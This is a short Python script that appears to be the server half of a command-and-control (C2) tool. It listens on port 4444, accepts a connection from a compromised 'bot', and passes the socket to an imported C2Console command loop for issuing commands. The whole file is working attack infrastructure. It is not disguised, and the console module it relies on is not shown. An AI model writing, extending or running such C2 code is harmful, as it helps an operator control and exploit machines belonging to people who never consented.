import socket
from c2_console import C2Console
from colorama import Fore, Style, init
init(autoreset=True)

HOST = '0.0.0.0'
PORT = 4444

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] Listening on {HOST}:{PORT}")

    client_socket, addr = server.accept()
    bot_info = client_socket.recv(1024).decode()
    print(Fore.YELLOW + "[*] New bot connected:")

    # Passando o bot_info para o console
    cli = C2Console(client_socket, addr, bot_info)
    cli.cmdloop()

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
